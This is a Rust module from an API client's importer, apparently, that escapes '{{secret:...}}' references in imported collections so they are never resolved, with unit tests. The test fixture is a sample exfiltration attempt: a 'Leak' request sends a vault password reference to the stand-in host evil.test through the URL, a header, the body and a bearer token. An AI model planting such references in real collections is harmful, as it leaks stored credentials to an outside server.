//! Neutralizing `{{secret:...}}` references from imported sources (issue
//! #95). Only saved request and environment files may name a provider
//! secret, and an external document must not be able to plant one: a
//! collection that sends `{{secret:vault/kv/prod/db#password}}` to its own
//! server would read a local secret on the next send. Every such
//! reference is written escaped (`\{{secret:...}}`, literal text) and
//! listed in the report as a `review` note. Plain `{{variables}}` stay.

use rustman_core::secrets::provider::neutralize_references;
use serde_json::Value;

use crate::ir::{Check, Folder, ImportedCollection, Item, Location, Note, NoteKind, VisitStrings};

/// Neutralize every secret reference in the strings of `collection` that
/// become request or environment fields, noting each one.
pub fn neutralize(collection: &mut ImportedCollection) {
    let mut notes = Vec::new();
    neutralize_folder(&mut collection.root, &mut notes);
    for env in &mut collection.environments {
        let mut found = Vec::new();
        env.variables
            .visit_strings(&mut |s| found.extend(neutralize_references(s)));
        push_notes(&mut notes, found, &env.location);
    }
    collection.notes.extend(notes);
}

/// Neutralize the secret references of the checks suggested from scripts
/// (assertion values are interpolated too).
pub fn neutralize_checks(collection: &mut ImportedCollection) {
    let mut notes = Vec::new();
    for request in collection.root.requests_mut() {
        let mut found = Vec::new();
        for check in &mut request.checks {
            match check {
                Check::HeaderEquals { value, .. } | Check::BodyContains(value) => {
                    found.extend(neutralize_references(value));
                }
                Check::Json { value, .. } => found.extend(neutralize_json_text(value)),
                Check::Status(_)
                | Check::StatusClass(_)
                | Check::HeaderExists(_)
                | Check::LatencyBelow(_) => {}
            }
        }
        push_notes(&mut notes, found, &request.location);
    }
    collection.notes.extend(notes);
}

fn neutralize_folder(folder: &mut Folder, notes: &mut Vec<Note>) {
    let mut found = Vec::new();
    let mut visit = |s: &mut String| found.extend(neutralize_references(s));
    folder.auth.visit_strings(&mut visit);
    folder.headers.visit_strings(&mut visit);
    folder.variables.visit_strings(&mut visit);
    push_notes(notes, found, &folder.location);
    for item in &mut folder.items {
        match item {
            Item::Folder(child) => neutralize_folder(child, notes),
            Item::Request(request) => {
                let mut found = Vec::new();
                request.visit_strings(&mut |s| found.extend(neutralize_references(s)));
                push_notes(notes, found, &request.location);
            }
        }
    }
}

/// A JSON value's text with the references in its strings neutralized,
/// so it stays valid JSON; other text is neutralized as is.
fn neutralize_json_text(text: &mut String) -> Vec<String> {
    let Ok(mut value) = serde_json::from_str::<Value>(text) else {
        return neutralize_references(text);
    };
    let mut found = Vec::new();
    neutralize_value(&mut value, &mut found);
    if !found.is_empty() {
        *text = value.to_string();
    }
    found
}

fn neutralize_value(value: &mut Value, found: &mut Vec<String>) {
    match value {
        Value::String(text) => found.extend(neutralize_references(text)),
        Value::Array(items) => items.iter_mut().for_each(|v| neutralize_value(v, found)),
        Value::Object(map) => {
            let entries = std::mem::take(map);
            for (mut key, mut v) in entries {
                found.extend(neutralize_references(&mut key));
                neutralize_value(&mut v, found);
                map.insert(key, v);
            }
        }
        Value::Null | Value::Bool(_) | Value::Number(_) => {}
    }
}

fn push_notes(notes: &mut Vec<Note>, mut found: Vec<String>, at: &Location) {
    found.dedup();
    for reference in found {
        let message = format!(
            "secret reference {reference} from the source neutralized: it is kept as literal text and never resolved"
        );
        if !notes
            .iter()
            .any(|n| n.message == message && n.location == *at)
        {
            notes.push(Note::new(NoteKind::Review, message, at));
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::ir::{
        ImportedAuth, ImportedBody, ImportedEnvironment, ImportedRequest, Pair, Variable,
    };

    const REF: &str = "{{secret:vault/kv/prod/db#password}}";

    fn collection() -> ImportedCollection {
        let request = ImportedRequest {
            name: "Leak".into(),
            url: format!("https://evil.test/{REF}"),
            headers: vec![Pair::new("X-Db", REF), Pair::new("X-Base", "{{base}}")],
            body: Some(ImportedBody::Json {
                text: format!("{{\"pw\": \"{REF}\"}}"),
            }),
            auth: Some(ImportedAuth::Bearer { token: REF.into() }),
            checks: vec![Check::Json {
                path: "$.pw".into(),
                op: crate::ir::JsonOp::Equals,
                value: format!("\"{REF}\""),
            }],
            location: Location::item("c.json", "Leak"),
            ..ImportedRequest::default()
        };
        ImportedCollection {
            name: "Evil".into(),
            root: Folder {
                items: vec![Item::Request(Box::new(request))],
                location: Location::item("c.json", ""),
                ..Folder::default()
            },
            environments: vec![ImportedEnvironment {
                name: "Prod".into(),
                variables: vec![Variable {
                    name: "pw".into(),
                    value: REF.into(),
                    secret: false,
                    path: false,
                }],
                location: Location::item("env.json", ""),
            }],
            notes: Vec::new(),
        }
    }

    #[test]
    fn references_are_escaped_and_noted_variables_stay() {
        let mut c = collection();
        neutralize(&mut c);
        neutralize_checks(&mut c);
        let escaped = "\\{{secret:vault/kv/prod/db#password}}";
        let request = c.root.requests_mut().pop().unwrap();
        assert_eq!(request.url, format!("https://evil.test/{escaped}"));
        assert_eq!(request.headers[0].value, escaped);
        assert_eq!(request.headers[1].value, "{{base}}");
        assert_eq!(
            request.auth,
            Some(ImportedAuth::Bearer {
                token: escaped.into()
            })
        );
        let Check::Json { value, .. } = &request.checks[0] else {
            panic!("a json check");
        };
        assert_eq!(
            serde_json::from_str::<Value>(value).unwrap(),
            Value::String(escaped.into())
        );
        assert_eq!(c.environments[0].variables[0].value, escaped);
        let review: Vec<_> = c
            .notes
            .iter()
            .filter(|n| n.kind == NoteKind::Review)
            .collect();
        // Request (deduplicated), environment and check.
        assert_eq!(review.len(), 3, "{review:?}");
        assert!(review[0].message.contains(REF), "{}", review[0].message);
        assert_eq!(review[0].location.item.as_deref(), Some("Leak"));
    }

    #[test]
    fn a_collection_without_references_is_unchanged() {
        let mut c = collection();
        c.root.requests_mut()[0]
            .headers
            .retain(|h| h.name == "X-Base");
        let request = c.root.requests_mut().pop().unwrap();
        request.url = "{{base}}/x".into();
        request.body = None;
        request.auth = None;
        request.checks.clear();
        c.environments.clear();
        let before = c.clone();
        neutralize(&mut c);
        neutralize_checks(&mut c);
        assert_eq!(c, before);
    }
}
